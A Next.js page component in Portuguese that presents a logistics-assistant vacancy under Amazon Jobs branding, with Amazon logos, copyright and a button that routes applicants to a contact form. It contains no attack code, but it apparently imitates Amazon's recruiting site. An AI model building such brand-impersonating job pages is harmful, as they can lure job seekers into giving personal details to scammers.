"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import "./logistic.css";

export default function LogisticsJobDetails() {
  const router = useRouter();

  const handleApply = () => {
    const vaga = {
      id: "LOG12345",
      titulo: "Assistente de Logística – Centro de Distribuição",
      local: "Centro de Distribuição, Brazil",
    salario: "R$ 3.350,00/mês", // 👈 agora o salário também vai
    };

    // salva no localStorage
    localStorage.setItem("vagaSelecionada", JSON.stringify(vaga));

    // redireciona para a candidatura
    router.push("/ApplicationContact");
  };

  return (
    <main className="vaga-detalhe">
      {/* HEADER */}
      <header>
        <div className="navbar">
          {/* LOGO */}
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>

          {/* LINKS CENTRALIZADOS */}
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      {/* HERO */}
      <section className="hero-vaga">
        <h1>Assistente de Logística – Centro de Distribuição</h1>
        <p>
          Faça parte da equipe que mantém o fluxo da Amazon funcionando! 
          Trabalhe em nosso centro de distribuição organizando pedidos, 
          controlando estoque e garantindo que cada cliente receba seu 
          produto no prazo certo.
        </p>
      </section>

      {/* SOBRE A FUNÇÃO */}
      <section className="sobre">
        <h2>Sobre a Função</h2>
        <p>
          Como Assistente de Logística, você será responsável por apoiar as
          operações de armazenagem, separação e expedição de produtos. Essa
          posição é presencial em nosso centro de distribuição e conta com
          treinamentos completos para a função.
        </p>
      </section>

      {/* HORÁRIOS */}
      <section className="horarios">
        <h2>Quais são os horários?</h2>
        <p>
          Oferecemos diferentes turnos para atender às necessidades da operação
          e dos colaboradores. Escalas incluem finais de semana e feriados.
        </p>
        <ul>
          <li>Turno diurno: 07h às 15h20</li>
          <li>Turno vespertino: 13h40 às 22h</li>
          <li>Turno noturno: 22h às 06h20</li>
          <li>Mínimo de 36 horas semanais</li>
        </ul>
      </section>

      {/* BENEFÍCIOS */}
      <section className="beneficios">
        <h2>Quais benefícios você receberá?</h2>
        <ul>
          <li>Plano de saúde e odontológico</li>
          <li>Seguro de vida</li>
          <li>Vale refeição e vale transporte</li>
          <li>Treinamento remunerado</li>
          <li>Ajuda de custo Internet (quando em home office)</li>
          <li>Programa de previdência complementar</li>
        </ul>
      </section>

      {/* EQUIPAMENTOS */}
      <section className="equipamentos">
        <h2>Equipamentos fornecidos</h2>
        <p>
          Durante sua jornada no centro de distribuição, você terá acesso a
          todos os equipamentos de segurança e trabalho necessários:
        </p>
        <ul>
          <li>Uniforme completo</li>
          <li>Equipamentos de proteção individual (EPI)</li>
          <li>Dispositivos de leitura de código de barras</li>
          <li>Coletores de dados</li>
        </ul>
        <p className="aviso">
          O uso correto dos equipamentos de segurança é obrigatório em todas as
          áreas do centro de distribuição.
        </p>
      </section>

      {/* CTA FINAL */}
      <section className="cta-final">
        <h2>Pronto para se candidatar?</h2>
        <button onClick={handleApply} className="btn-candidatar">
          Candidate-se agora →
        </button>
      </section>

      {/* FOOTER */}
      <footer className="footer">
        <div className="footer-social">
          <h4>Junte-se a nós agora</h4>
          <a href="#" aria-label="Facebook" className="social-link">
            <svg
              width="22"
              height="22"
              viewBox="0 0 448 512"
              fill="currentColor"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
              37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
              38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z"/>
            </svg>
          </a>
        </div>

        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li><a href="#">Centros de Distribuição e Estações de Entrega</a></li>
              <li><a href="#">Empregos de atendimento ao cliente</a></li>
              <li><a href="#">Procura de emprego</a></li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li><a href="#">Perguntas Frequentes</a></li>
              <li><a href="#">Fale Conosco</a></li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado e inclusivo.  
            A Amazon é uma empregadora que oferece oportunidades iguais e não discrimina com base em raça, nacionalidade, sexo, identidade de gênero, orientação sexual, deficiência, idade ou outro status legalmente protegido.
          </p>

          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
